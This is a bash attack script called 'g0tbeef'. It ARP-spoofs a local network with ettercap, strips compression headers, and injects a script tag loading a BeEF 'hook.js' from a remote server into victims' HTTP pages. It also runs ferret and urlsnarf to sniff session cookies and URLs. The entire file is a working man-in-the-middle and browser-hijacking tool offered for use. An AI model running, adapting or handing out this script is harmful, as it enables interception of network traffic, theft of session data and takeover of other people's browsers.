#!/bin/bash

ROUTE=$(route -n | grep Gate -A 1 | grep 0.0 | cut -d "." -f 4-7 | tr -d ' ')
ROUTE=${ROUTE:1:-1}
LAN=$(echo $ROUTE | cut -d '.' -f 1-3)'.'
NIC=$(ifconfig | grep $LAN -B 1 | cut -d ' ' -f 1 | head -n 1)
MYI=$(ifconfig | grep $LAN | cut -d ':' -f 2 | cut -d ' ' -f 1)

fhelp()
{
	echo """
g0tbeef - Inject Beef hooks into html responses via ARP spoofing

Usage:  g0tbeef <options>

		-t <ip>   ~  ip extension to target
		-r <ip>   ~  remote beef server
		-p <port> ~  port of beef server
		
Examples:
	g0tbeef -t 2								
	  ~  Attack "$LAN"2 beef hook: $MYI:3000/hook.js
	  
	g0tbeef -r googlebeefhook.com -p 80	
	  ~  beef hook: http://googlebeefhook.com:80/hook.js
";exit
}

ACNT=1																	#Parse command line arguments
for ARG in $@
do
	ACNT=$((ACNT + 1))
	case $ARG in "-h")fhelp;;"--help")fhelp;;"-r")IP=$(echo $@ | cut -d " " -f $ACNT);;"-p")PORT=$(echo $@ | cut -d " " -f $ACNT);;"-t")TARG=$(echo $@ | cut -d " " -f $ACNT);esac
done

if [ $IP -z ] 2> /dev/null
then
	IP=$MYI
fi

if [ $PORT -z ] 2> /dev/null
then
	PORT=3000
fi
if [ $TARG -z ] 2> /dev/null
then
	echo
	read -p " [*] Enter the IP of your target (Empty for all) $LAN" TARG
fi
if [ $TARG -z ] 2> /dev/null
then
	TARG=""
else
	TARG=$LAN$TARG
fi
echo """ [*] We detected these settings:
Your IP: $IP
Your Router: $ROUTE
Your Network: $LAN
Interface: $NIC
Target: $TARG
"
read -p " [>] Is this correct? [Y/n]: " PROC
if [ $PROC = 'y' ] 2> /dev/null || [ $PROC = 'Y' ] 2> /dev/null
then
	A=1
else
	read -p " [>] Please enter your IP: " IP
	read -p " [>] Please enter Your Router: " ROUTE
	read -p " [>] Please enter your Network: " LAN
	read -p " [>] Please enter your Interface: " NIC
	read -p " [>] Please enter your Target: " TARG
fi
echo 1 > /proc/sys/net/ipv4/ip_forward
echo 'if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Hackers!"); 
      msg("Bypass: Accept-Encoding!\n");
   }
}
if (ip.proto == TCP && tcp.src == 80) {
   replace("</head>", "<script src=http://'"$IP"':'"$PORT"'/hook.js></script></head>");
   msg("Beef Hook: '"$IP"':'"$PORT"'/hook.js Injected!\n");
}' > etter.filter.jsinject

xterm -e "ferret -i $NIC"&
xterm -e "urlsnarf -i $NIC"&
etterfilter etter.filter.jsinject -o jsinject.ef 2> /dev/null
sleep 4 && echo " [*] Beef Hook: http://$IP:$PORT/hook.js" && echo " [*] Filter Activated, waiting for requests..." && echo " [*] Press 'q' to quit" && echo&
if [ $TARG -z ] 2> /dev/null
then
	ettercap -i $NIC -P autoadd -TqF jsinject.ef -M ARP // //
else
	ettercap -i $NIC -TqF jsinject.ef -M ARP /$TARG/ //
fi
killall ferret
killall urlsnarf
